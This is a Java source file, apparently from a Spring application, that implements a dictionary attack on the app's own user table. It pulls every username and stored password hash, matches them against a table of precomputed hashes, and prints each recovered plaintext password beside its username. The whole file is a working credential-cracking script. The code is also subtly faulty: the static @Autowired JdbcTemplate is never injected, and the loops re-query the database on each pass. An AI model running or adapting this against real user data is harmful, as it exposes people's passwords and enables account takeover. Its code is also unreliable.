package snsinternaltransfer.sns.utility.dictionaryAttack;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.dao.DataAccessException;
import org.springframework.jdbc.core.BeanPropertyRowMapper;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.ResultSetExtractor;
import org.springframework.jdbc.core.RowMapper;
import snsinternaltransfer.sns.models.Transfer;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class DictionaryAttack {

    @Autowired
    static JdbcTemplate template;


    public static List<Victim> getVictims(){
        String sql = "SELECT USER_NAME, ENCRYPTED_PASSWORD FROM sns.app_user";


        return template.query(sql, new ResultSetExtractor<List<Victim>>() {
            @Override
            public List<Victim> extractData(ResultSet rs) throws SQLException, DataAccessException {

                String username, password;



                ArrayList<Victim> victims = new ArrayList<>();

                while (rs.next()) {

                    username = rs.getString("USER_NAME");
                    password = rs.getString("ENCRYPTED_PASSWORD");




                    victims.add(new Victim(username, password));
                }
                return victims;
            }
        });


    }


    public static List<Passwords> getPasswords(){

        String sql ="SELECT hash, value FROM sns.dictionary";


        return template.query(sql, new ResultSetExtractor<List<Passwords>>() {
            @Override
            public List<Passwords> extractData(ResultSet rs) throws SQLException, DataAccessException {

                String hash, value;



                ArrayList<Passwords> passwords = new ArrayList<>();

                while (rs.next()) {

                    hash = rs.getString("hash");
                    value = rs.getString("value");




                    passwords.add(new Passwords(hash, value));
                }
                return passwords;
            }
        });



    }

    public static void compare(){
        for (int j = 0; j< getPasswords().size();j++){

            for (int i = 0; i< getVictims().size();i++){
                if (getVictims().get(i).getPassword().equals(getPasswords().get(j).getHash())){
                    System.out.println("found something!" +
                            "\nUsername: "+getVictims().get(i).getUsername()
                            +"\nPassword: "+getPasswords().get(j).getValue());
                }
            }

        }

    }

    public static void main(String[] args) {
        compare();
    }



}
